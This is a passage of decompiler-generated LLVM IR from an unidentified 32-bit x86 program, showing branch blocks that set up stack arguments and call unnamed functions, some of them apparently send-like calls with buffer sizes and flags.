  %v3_804dfba = load i32, i32* %stack_var_-320, align 4
  %v5_804dfba = call i32 @function_80526e8(i32 %v0_804dfba, i32 %v1_804dfba, i32 10000, i32 %v3_804dfba, i32 ptrtoint (i32* @0 to i32))
  %v3_804dfbf = load i32, i32* %stack_var_-192, align 4
  %v1_804dfc5 = icmp eq i32 %v3_804dfbf, 0
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804e03b = load i32, i32* %v3_804ded1, align 4
  store i32 %v4_804e03b, i32* %eax.global-to-local, align 4
  %v0_804e03e = load i32, i32* @esp, align 4
  br i1 %v1_804dfc5, label %dec_label_pc_804e025, label %dec_label_pc_804dfc9

dec_label_pc_804dfc9:                             ; preds = %dec_label_pc_804df66
  %v2_804dfe2 = inttoptr i32 %v0_804e03e to i32*
  store i32 %v4_804e03b, i32* %v2_804dfe2, align 4
  %v0_804dfe5 = load i32, i32* %stack_var_-192, align 4
  %v1_804dfe5 = call i32 @function_804d879(i32 %v0_804dfe5)
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e01b = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e01b = inttoptr i32 %v3_804e01b to i8*
  store i8 1, i8* %v4_804e01b, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e025:                             ; preds = %dec_label_pc_804df66
  %v1_804e03e = add i32 %v0_804e03e, 8
  %v2_804e03e = inttoptr i32 %v1_804e03e to i32*
  store i32 0, i32* %v2_804e03e, align 4
  %v0_804e046 = load i32, i32* @esp, align 4
  %v1_804e046 = add i32 %v0_804e046, 4
  %v2_804e046 = inttoptr i32 %v1_804e046 to i32*
  store i32 3, i32* %v2_804e046, align 4
  %v0_804e04e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e04e = load i32, i32* @esp, align 4
  %v2_804e04e = inttoptr i32 %v1_804e04e to i32*
  store i32 %v0_804e04e, i32* %v2_804e04e, align 4
  %v0_804e051 = load i32, i32* %stack_var_-192, align 4
  %v3_804e051 = call i32 @function_8050a3c(i32 %v0_804e051, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_804e058 = and i32 %v3_804e051, -2049
  store i32 %v1_804e058, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804e074 = load i32, i32* %v3_804ded1, align 4
  store i32 %v4_804e074, i32* %eax.global-to-local, align 4
  %v1_804e077 = load i32, i32* @esp, align 4
  %v2_804e077 = add i32 %v1_804e077, 8
  %v3_804e077 = inttoptr i32 %v2_804e077 to i32*
  store i32 %v1_804e058, i32* %v3_804e077, align 4
  %v0_804e07b = load i32, i32* @esp, align 4
  %v1_804e07b = add i32 %v0_804e07b, 4
  %v2_804e07b = inttoptr i32 %v1_804e07b to i32*
  store i32 4, i32* %v2_804e07b, align 4
  %v0_804e083 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e083 = load i32, i32* @esp, align 4
  %v2_804e083 = inttoptr i32 %v1_804e083 to i32*
  store i32 %v0_804e083, i32* %v2_804e083, align 4
  %v0_804e086 = load i32, i32* %stack_var_-192, align 4
  %v3_804e086 = call i32 @function_8050a3c(i32 %v0_804e086, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 0, i32* %v1_804da55, align 4
  %v1_804e0c7 = add i32 %v2_804da50, 20
  %v2_804e0c7 = inttoptr i32 %v1_804e0c7 to i16*
  store i16 0, i16* %v2_804e0c7, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  %v1_804e0e5 = add i32 %v2_804da50, 24
  store i32 %v1_804e0e5, i32* %eax.global-to-local, align 4
  %v1_804e0e8 = inttoptr i32 %v1_804e0e5 to i32*
  %v2_804e0e8 = load i32, i32* %v1_804e0e8, align 4
  store i32 %v2_804e0e8, i32* %edx.global-to-local, align 4
  store i32 512, i32* %eax.global-to-local, align 4
  %v1_804e0f1 = load i32, i32* @esp, align 4
  %v2_804e0f1 = add i32 %v1_804e0f1, 8
  %v3_804e0f1 = inttoptr i32 %v2_804e0f1 to i32*
  store i32 512, i32* %v3_804e0f1, align 4
  %v0_804e0f5 = load i32, i32* @esp, align 4
  %v1_804e0f5 = add i32 %v0_804e0f5, 4
  %v2_804e0f5 = inttoptr i32 %v1_804e0f5 to i32*
  store i32 0, i32* %v2_804e0f5, align 4
  %v0_804e0fd = load i32, i32* %edx.global-to-local, align 4
  %v1_804e0fd = load i32, i32* @esp, align 4
  %v2_804e0fd = inttoptr i32 %v1_804e0fd to i32*
  store i32 %v0_804e0fd, i32* %v2_804e0fd, align 4
  %v0_804e100 = load i32, i32* %stack_var_-192, align 4
  %v3_804e100 = inttoptr i32 %v0_804e100 to i8*
  %v4_804e100 = call i32 @function_8051e84(i8* %v3_804e100, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e125:                             ; preds = %dec_label_pc_804dea2
  %v13_804e125 = icmp eq i32 %v5_804df54, -1
  %v1_804e129 = icmp eq i1 %v13_804e125, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e129, label %dec_label_pc_804e187, label %dec_label_pc_804e12b

dec_label_pc_804e12b:                             ; preds = %dec_label_pc_804e125
  %v4_804e141 = load i32, i32* %v3_804ded1, align 4
  store i32 %v4_804e141, i32* %eax.global-to-local, align 4
  %v1_804e144 = load i32, i32* @esp, align 4
  %v2_804e144 = inttoptr i32 %v1_804e144 to i32*
  store i32 %v4_804e141, i32* %v2_804e144, align 4
  %v1_804e147 = call i32 @function_804d879(i32 %v5_804df54)
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e17d = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e17d = inttoptr i32 %v3_804e17d to i8*
  store i8 1, i8* %v4_804e17d, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e187:                             ; preds = %dec_label_pc_804e125
  store i32 %v1_804da52, i32* %eax.global-to-local, align 4
  %v2_804e1a2 = load i32, i32* %v1_804da55, align 4
  store i32 %v2_804e1a2, i32* %eax.global-to-local, align 4
  %v1_804e1a4 = add i32 %v2_804e1a2, 6
  store i32 %v1_804e1a4, i32* @ebx, align 4
  %v0_804e1a7 = load i32, i32* @esp, align 4
  %v1_804e1a7 = inttoptr i32 %v0_804e1a7 to i32*
  store i32 0, i32* %v1_804e1a7, align 4
  %v1_804e1ae = inttoptr i32 %v5_804df54 to i32*
  %v2_804e1ae = call i32 @function_8050ed8(i32* %v1_804e1ae)
  store i32 %v2_804e1ae, i32* %eax.global-to-local, align 4
  %v0_804e1b3 = load i32, i32* @ebx, align 4
  %v7_804e1b3 = icmp ult i32 %v0_804e1b3, %v2_804e1ae
  %v1_804e1b5 = icmp eq i1 %v7_804e1b3, false
  br i1 %v1_804e1b5, label %dec_label_pc_804eb34, label %dec_label_pc_804e1bb

dec_label_pc_804e1bb:                             ; preds = %dec_label_pc_804e187
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v4_804e1d1 = load i32, i32* %v3_804ded1, align 4
  store i32 %v4_804e1d1, i32* %eax.global-to-local, align 4
  %v1_804e1d4 = load i32, i32* @esp, align 4
  %v2_804e1d4 = inttoptr i32 %v1_804e1d4 to i32*
  store i32 %v4_804e1d1, i32* %v2_804e1d4, align 4
  %v0_804e1d7 = load i32, i32* %stack_var_-192, align 4
  %v1_804e1d7 = call i32 @function_804d879(i32 %v0_804e1d7)
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e20d = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e20d = inttoptr i32 %v3_804e20d to i8*
  store i8 1, i8* %v4_804e20d, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e217:                             ; preds = %dec_label_pc_804da88
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  %v1_804e22f = add i32 %v2_804da50, 24
  store i32 %v1_804e22f, i32* %eax.global-to-local, align 4
  %v1_804e232 = inttoptr i32 %v1_804e22f to i32*
  %v2_804e232 = load i32, i32* %v1_804e232, align 4
  store i32 %v2_804e232, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e24a = inttoptr i32 %v2_804da50 to i32*
  %v4_804e24a = load i32, i32* %v3_804e24a, align 4
  store i32 %v4_804e24a, i32* %eax.global-to-local, align 4
  %v0_804e24d = load i32, i32* @esp, align 4
  %v1_804e24d = add i32 %v0_804e24d, 16
  %v2_804e24d = inttoptr i32 %v1_804e24d to i32*
  store i32 134602900, i32* %v2_804e24d, align 4
  %v0_804e255 = load i32, i32* @esp, align 4
  %v1_804e255 = add i32 %v0_804e255, 12
  %v2_804e255 = inttoptr i32 %v1_804e255 to i32*
  store i32 512, i32* %v2_804e255, align 4
  %v0_804e25d = load i32, i32* @ebx, align 4
  %v1_804e25d = load i32, i32* @esp, align 4
  %v2_804e25d = add i32 %v1_804e25d, 8
  %v3_804e25d = inttoptr i32 %v2_804e25d to i32*
  store i32 %v0_804e25d, i32* %v3_804e25d, align 4
  %v0_804e261 = load i32, i32* @esp, align 4
  %v1_804e261 = add i32 %v0_804e261, 4
  %v2_804e261 = inttoptr i32 %v1_804e261 to i32*
  store i32 10000, i32* %v2_804e261, align 4
  %v0_804e269 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e269 = load i32, i32* @esp, align 4
  %v2_804e269 = inttoptr i32 %v1_804e269 to i32*
  store i32 %v0_804e269, i32* %v2_804e269, align 4
  %v1_804e26c = call i32 @function_804855e(i32 %v6_804da9e)
  %v1_804e271 = icmp eq i32 %v1_804e26c, 0
  store i32 %v1_804da40, i32* @edx, align 4
  store i32 %v2_804da50, i32* %eax.global-to-local, align 4
  br i1 %v1_804e271, label %dec_label_pc_804e2de, label %dec_label_pc_804e275

dec_label_pc_804e275:                             ; preds = %dec_label_pc_804e217
  store i32 %v1_804e22f, i32* %eax.global-to-local, align 4
  %v2_804e290 = load i32, i32* %v1_804e232, align 4
  store i32 %v2_804e290, i32* %eax.global-to-local, align 4
  %v1_804e292 = load i32, i32* @esp, align 4
  %v2_804e292 = inttoptr i32 %v1_804e292 to i32*
  store i32 %v2_804e290, i32* %v2_804e292, align 4
  %v0_804e295 = load i32, i32* %stack_var_-192, align 4
  %v1_804e295 = call i32 @function_8048448(i32 %v0_804e295)
  %v1_804e29a = icmp eq i32 %v1_804e295, 0
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e29a, label %dec_label_pc_804e2be, label %dec_label_pc_804e29e

dec_label_pc_804e29e:                             ; preds = %dec_label_pc_804e275
  store i8 0, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e2be:                             ; preds = %dec_label_pc_804e275
  store i8 3, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e2de:                             ; preds = %dec_label_pc_804e217
  store i32 %v1_804da52, i32* %eax.global-to-local, align 4
  %v2_804e2f9 = load i32, i32* %v1_804da55, align 4
  store i32 %v2_804e2f9, i32* %eax.global-to-local, align 4
  %v1_804e2fb = add i32 %v2_804e2f9, 6
  store i32 %v1_804e2fb, i32* @ebx, align 4
  %v0_804e2fe = load i32, i32* @esp, align 4
  %v1_804e2fe = inttoptr i32 %v0_804e2fe to i32*
  store i32 0, i32* %v1_804e2fe, align 4
  %v0_804e305 = load i32, i32* %stack_var_-192, align 4
  %v1_804e305 = inttoptr i32 %v0_804e305 to i32*
  %v2_804e305 = call i32 @function_8050ed8(i32* %v1_804e305)
  store i32 %v2_804e305, i32* %eax.global-to-local, align 4
  %v0_804e30a = load i32, i32* @ebx, align 4
  %v7_804e30a = icmp ult i32 %v0_804e30a, %v2_804e305
  %v1_804e30c = icmp eq i1 %v7_804e30a, false
  br i1 %v1_804e30c, label %dec_label_pc_804eb34, label %dec_label_pc_804e312

dec_label_pc_804e312:                             ; preds = %dec_label_pc_804e2de
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e343 = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e343 = inttoptr i32 %v3_804e343 to i8*
  store i8 1, i8* %v4_804e343, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e34d:                             ; preds = %dec_label_pc_804da88
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e363 = add i32 %v2_804dc16, %v2_804da4e
  %v4_804e363 = inttoptr i32 %v3_804e363 to i8*
  %v5_804e363 = load i8, i8* %v4_804e363, align 2
  %v6_804e363 = zext i8 %v5_804e363 to i32
  store i32 %v6_804e363, i32* %eax.global-to-local, align 4
  %v1_804e36b = mul nuw nsw i32 %v6_804e363, 4
  %v2_804e36b = add nuw nsw i32 %v1_804e36b, 134603072
  %v3_804e36b = inttoptr i32 %v2_804e36b to i32*
  %v4_804e36b = load i32, i32* %v3_804e36b, align 4
  %v1_804e37d = and i32 %v4_804e36b, -256
  store i32 %v1_804e37d, i32* %eax.global-to-local, align 4
  %v4_804e380 = inttoptr i32 %v4_804e36b to i8*
  store i32 %v4_804e36b, i32* @edi, align 4
  %v3_804e386 = call i32 @_strlen(i8* %v4_804e380)
  store i32 %v3_804e386, i32* @esi, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v5_804e3a5 = load i8, i8* %v4_804e363, align 2
  %v6_804e3a5 = zext i8 %v5_804e3a5 to i32
  store i32 %v6_804e3a5, i32* %eax.global-to-local, align 4
  %v1_804e3ad = mul nuw nsw i32 %v6_804e3a5, 4
  %v2_804e3ad = add nuw nsw i32 %v1_804e3ad, 134603072
  %v3_804e3ad = inttoptr i32 %v2_804e3ad to i32*
  %v4_804e3ad = load i32, i32* %v3_804e3ad, align 4
  store i32 %v4_804e3ad, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e3ca = inttoptr i32 %v2_804da50 to i32*
  %v4_804e3ca = load i32, i32* %v3_804e3ca, align 4
  store i32 %v4_804e3ca, i32* %eax.global-to-local, align 4
  %v0_804e3cd = load i32, i32* @esp, align 4
  %v1_804e3cd = add i32 %v0_804e3cd, 12
  %v2_804e3cd = inttoptr i32 %v1_804e3cd to i32*
  store i32 16384, i32* %v2_804e3cd, align 4
  %v0_804e3d5 = load i32, i32* @esi, align 4
  %v1_804e3d5 = load i32, i32* @esp, align 4
  %v2_804e3d5 = add i32 %v1_804e3d5, 8
  %v3_804e3d5 = inttoptr i32 %v2_804e3d5 to i32*
  store i32 %v0_804e3d5, i32* %v3_804e3d5, align 4
  %v0_804e3d9 = load i32, i32* @ebx, align 4
  %v1_804e3d9 = load i32, i32* @esp, align 4
  %v2_804e3d9 = add i32 %v1_804e3d9, 4
  %v3_804e3d9 = inttoptr i32 %v2_804e3d9 to i32*
  store i32 %v0_804e3d9, i32* %v3_804e3d9, align 4
  %v0_804e3dd = load i32, i32* %eax.global-to-local, align 4
  %v1_804e3dd = load i32, i32* @esp, align 4
  %v2_804e3dd = inttoptr i32 %v1_804e3dd to i32*
  store i32 %v0_804e3dd, i32* %v2_804e3dd, align 4
  %v4_804e3e0 = call i32 @function_8052758(i32 %v4_804e36b, i32 %v2_804d971, i32 %v6_804da9e, i32 ptrtoint (i32* @0 to i32))
  %v2_804e3e5 = icmp slt i32 %v4_804e3e0, 0
  %v1_804e3e7 = icmp eq i1 %v2_804e3e5, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e3e7, label %dec_label_pc_804e424, label %dec_label_pc_804e3e9

dec_label_pc_804e3e9:                             ; preds = %dec_label_pc_804e34d
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e41a = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e41a = inttoptr i32 %v3_804e41a to i8*
  store i8 1, i8* %v4_804e41a, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e424:                             ; preds = %dec_label_pc_804e34d
  %v4_804e43a = load i32, i32* %v3_804e3ca, align 4
  store i32 %v4_804e43a, i32* %eax.global-to-local, align 4
  %v0_804e43d = load i32, i32* @esp, align 4
  %v1_804e43d = add i32 %v0_804e43d, 12
  %v2_804e43d = inttoptr i32 %v1_804e43d to i32*
  store i32 16384, i32* %v2_804e43d, align 4
  %v0_804e445 = load i32, i32* @esp, align 4
  %v1_804e445 = add i32 %v0_804e445, 8
  %v2_804e445 = inttoptr i32 %v1_804e445 to i32*
  store i32 2, i32* %v2_804e445, align 4
  %v0_804e44d = load i32, i32* @esp, align 4
  %v1_804e44d = add i32 %v0_804e44d, 4
  %v2_804e44d = inttoptr i32 %v1_804e44d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805b68d.295 to i32), i32* %v2_804e44d, align 4
  %v0_804e455 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e455 = load i32, i32* @esp, align 4
  %v2_804e455 = inttoptr i32 %v1_804e455 to i32*
  store i32 %v0_804e455, i32* %v2_804e455, align 4
  %v4_804e458 = call i32 @function_8052758(i32 %v4_804e36b, i32 %v2_804d971, i32 %v6_804da9e, i32 ptrtoint (i32* @0 to i32))
  %v2_804e45d = icmp slt i32 %v4_804e458, 0
  %v1_804e45f = icmp eq i1 %v2_804e45d, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e45f, label %dec_label_pc_804e49c, label %dec_label_pc_804e461

dec_label_pc_804e461:                             ; preds = %dec_label_pc_804e424
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e492 = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e492 = inttoptr i32 %v3_804e492 to i8*
  store i8 1, i8* %v4_804e492, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e49c:                             ; preds = %dec_label_pc_804e424
  store i8 4, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e4bc:                             ; preds = %dec_label_pc_804da88
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  %v1_804e4d4 = add i32 %v2_804da50, 24
  store i32 %v1_804e4d4, i32* %eax.global-to-local, align 4
  %v1_804e4d7 = inttoptr i32 %v1_804e4d4 to i32*
  %v2_804e4d7 = load i32, i32* %v1_804e4d7, align 4
  store i32 %v2_804e4d7, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e4ef = inttoptr i32 %v2_804da50 to i32*
  %v4_804e4ef = load i32, i32* %v3_804e4ef, align 4
  store i32 %v4_804e4ef, i32* %eax.global-to-local, align 4
  %v0_804e4f2 = load i32, i32* @esp, align 4
  %v1_804e4f2 = add i32 %v0_804e4f2, 16
  %v2_804e4f2 = inttoptr i32 %v1_804e4f2 to i32*
  store i32 ptrtoint (i32* @global_var_805e094 to i32), i32* %v2_804e4f2, align 4
  %v0_804e4fa = load i32, i32* @esp, align 4
  %v1_804e4fa = add i32 %v0_804e4fa, 12
  %v2_804e4fa = inttoptr i32 %v1_804e4fa to i32*
  store i32 512, i32* %v2_804e4fa, align 4
  %v0_804e502 = load i32, i32* @ebx, align 4
  %v1_804e502 = load i32, i32* @esp, align 4
  %v2_804e502 = add i32 %v1_804e502, 8
  %v3_804e502 = inttoptr i32 %v2_804e502 to i32*
  store i32 %v0_804e502, i32* %v3_804e502, align 4
  %v0_804e506 = load i32, i32* @esp, align 4
  %v1_804e506 = add i32 %v0_804e506, 4
  %v2_804e506 = inttoptr i32 %v1_804e506 to i32*
  store i32 10000, i32* %v2_804e506, align 4
  %v0_804e50e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e50e = load i32, i32* @esp, align 4
  %v2_804e50e = inttoptr i32 %v1_804e50e to i32*
  store i32 %v0_804e50e, i32* %v2_804e50e, align 4
  %v1_804e511 = call i32 @function_804855e(i32 %v6_804da9e)
  %v1_804e516 = icmp eq i32 %v1_804e511, 0
  store i32 %v1_804da40, i32* @edx, align 4
  store i32 %v2_804da50, i32* %eax.global-to-local, align 4
  br i1 %v1_804e516, label %dec_label_pc_804e583, label %dec_label_pc_804e51a

dec_label_pc_804e51a:                             ; preds = %dec_label_pc_804e4bc
  store i32 %v1_804e4d4, i32* %eax.global-to-local, align 4
  %v2_804e535 = load i32, i32* %v1_804e4d7, align 4
  store i32 %v2_804e535, i32* %eax.global-to-local, align 4
  %v1_804e537 = load i32, i32* @esp, align 4
  %v2_804e537 = inttoptr i32 %v1_804e537 to i32*
  store i32 %v2_804e535, i32* %v2_804e537, align 4
  %v1_804e53a = call i32 @function_8048448(i32 %stack_var_-624.237)
  %v1_804e53f = icmp eq i32 %v1_804e53a, 0
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e53f, label %dec_label_pc_804e563, label %dec_label_pc_804e543

dec_label_pc_804e543:                             ; preds = %dec_label_pc_804e51a
  store i8 0, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e563:                             ; preds = %dec_label_pc_804e51a
  store i8 5, i8* %v4_804da9e, align 4
  br label %dec_label_pc_804eb34

dec_label_pc_804e583:                             ; preds = %dec_label_pc_804e4bc
  store i32 %v1_804da52, i32* %eax.global-to-local, align 4
  %v2_804e59e = load i32, i32* %v1_804da55, align 4
  store i32 %v2_804e59e, i32* %eax.global-to-local, align 4
  %v1_804e5a0 = add i32 %v2_804e59e, 6
  store i32 %v1_804e5a0, i32* @ebx, align 4
  %v0_804e5a3 = load i32, i32* @esp, align 4
  %v1_804e5a3 = inttoptr i32 %v0_804e5a3 to i32*
  store i32 0, i32* %v1_804e5a3, align 4
  %v1_804e5aa = inttoptr i32 %stack_var_-624.237 to i32*
  %v2_804e5aa = call i32 @function_8050ed8(i32* %v1_804e5aa)
  store i32 %v2_804e5aa, i32* %eax.global-to-local, align 4
  %v0_804e5af = load i32, i32* @ebx, align 4
  %v7_804e5af = icmp ult i32 %v0_804e5af, %v2_804e5aa
  %v1_804e5b1 = icmp eq i1 %v7_804e5af, false
  br i1 %v1_804e5b1, label %dec_label_pc_804eb34, label %dec_label_pc_804e5b7

dec_label_pc_804e5b7:                             ; preds = %dec_label_pc_804e583
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e5e8 = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e5e8 = inttoptr i32 %v3_804e5e8 to i8*
  store i8 1, i8* %v4_804e5e8, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e5f2:                             ; preds = %dec_label_pc_804da88
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e608 = add i32 %v2_804dbcf, %v2_804da4e
  %v4_804e608 = inttoptr i32 %v3_804e608 to i8*
  %v5_804e608 = load i8, i8* %v4_804e608, align 1
  %v6_804e608 = zext i8 %v5_804e608 to i32
  store i32 %v6_804e608, i32* %eax.global-to-local, align 4
  %v1_804e610 = mul nuw nsw i32 %v6_804e608, 4
  %v2_804e610 = add nuw nsw i32 %v1_804e610, 134603136
  %v3_804e610 = inttoptr i32 %v2_804e610 to i32*
  %v4_804e610 = load i32, i32* %v3_804e610, align 4
  %v1_804e622 = and i32 %v4_804e610, -256
  store i32 %v1_804e622, i32* %eax.global-to-local, align 4
  %v4_804e625 = inttoptr i32 %v4_804e610 to i8*
  store i32 %v4_804e610, i32* @edi, align 4
  %v3_804e62b = call i32 @_strlen(i8* %v4_804e625)
  store i32 %v3_804e62b, i32* @esi, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v5_804e64a = load i8, i8* %v4_804e608, align 1
  %v6_804e64a = zext i8 %v5_804e64a to i32
  store i32 %v6_804e64a, i32* %eax.global-to-local, align 4
  %v1_804e652 = mul nuw nsw i32 %v6_804e64a, 4
  %v2_804e652 = add nuw nsw i32 %v1_804e652, 134603136
  %v3_804e652 = inttoptr i32 %v2_804e652 to i32*
  %v4_804e652 = load i32, i32* %v3_804e652, align 4
  store i32 %v4_804e652, i32* @ebx, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e66f = inttoptr i32 %v2_804da50 to i32*
  %v4_804e66f = load i32, i32* %v3_804e66f, align 4
  store i32 %v4_804e66f, i32* %eax.global-to-local, align 4
  %v0_804e672 = load i32, i32* @esp, align 4
  %v1_804e672 = add i32 %v0_804e672, 12
  %v2_804e672 = inttoptr i32 %v1_804e672 to i32*
  store i32 16384, i32* %v2_804e672, align 4
  %v0_804e67a = load i32, i32* @esi, align 4
  %v1_804e67a = load i32, i32* @esp, align 4
  %v2_804e67a = add i32 %v1_804e67a, 8
  %v3_804e67a = inttoptr i32 %v2_804e67a to i32*
  store i32 %v0_804e67a, i32* %v3_804e67a, align 4
  %v0_804e67e = load i32, i32* @ebx, align 4
  %v1_804e67e = load i32, i32* @esp, align 4
  %v2_804e67e = add i32 %v1_804e67e, 4
  %v3_804e67e = inttoptr i32 %v2_804e67e to i32*
  store i32 %v0_804e67e, i32* %v3_804e67e, align 4
  %v0_804e682 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e682 = load i32, i32* @esp, align 4
  %v2_804e682 = inttoptr i32 %v1_804e682 to i32*
  store i32 %v0_804e682, i32* %v2_804e682, align 4
  %v4_804e685 = call i32 @function_8052758(i32 %v4_804e610, i32 %stack_var_-624.237, i32 %v2_804d971, i32 %v6_804da9e)
  %v2_804e68a = icmp slt i32 %v4_804e685, 0
  %v1_804e68c = icmp eq i1 %v2_804e68a, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e68c, label %dec_label_pc_804e6c9, label %dec_label_pc_804e68e

dec_label_pc_804e68e:                             ; preds = %dec_label_pc_804e5f2
  store i8 0, i8* %v4_804da9e, align 4
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  %v3_804e6bf = add i32 %v2_804d9fa, %v2_804da4e
  %v4_804e6bf = inttoptr i32 %v3_804e6bf to i8*
  store i8 1, i8* %v4_804e6bf, align 1
  br label %dec_label_pc_804eb34

dec_label_pc_804e6c9:                             ; preds = %dec_label_pc_804e5f2
  %v4_804e6df = load i32, i32* %v3_804e66f, align 4
  store i32 %v4_804e6df, i32* %eax.global-to-local, align 4
  %v0_804e6e2 = load i32, i32* @esp, align 4
  %v1_804e6e2 = add i32 %v0_804e6e2, 12
  %v2_804e6e2 = inttoptr i32 %v1_804e6e2 to i32*
  store i32 16384, i32* %v2_804e6e2, align 4
  %v0_804e6ea = load i32, i32* @esp, align 4
  %v1_804e6ea = add i32 %v0_804e6ea, 8
  %v2_804e6ea = inttoptr i32 %v1_804e6ea to i32*
  store i32 2, i32* %v2_804e6ea, align 4
  %v0_804e6f2 = load i32, i32* @esp, align 4
  %v1_804e6f2 = add i32 %v0_804e6f2, 4
  %v2_804e6f2 = inttoptr i32 %v1_804e6f2 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_805b68d.295 to i32), i32* %v2_804e6f2, align 4
  %v0_804e6fa = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6fa = load i32, i32* @esp, align 4
  %v2_804e6fa = inttoptr i32 %v1_804e6fa to i32*
  store i32 %v0_804e6fa, i32* %v2_804e6fa, align 4
  %v4_804e6fd = call i32 @function_8052758(i32 %v4_804e610, i32 %stack_var_-624.237, i32 %v2_804d971, i32 %v6_804da9e)
  %v2_804e702 = icmp slt i32 %v4_804e6fd, 0
  %v1_804e704 = icmp eq i1 %v2_804e702, false
  store i32 %v1_804da40, i32* %edx.global-to-local, align 4
  store i32 %v2_804da4e, i32* %eax.global-to-local, align 4
  br i1 %v1_804e704, label %dec_label_pc_804e741, label %dec_label_pc_804e706

dec_label_pc_804e706:                             ; preds = %dec_label_pc_804e6c9
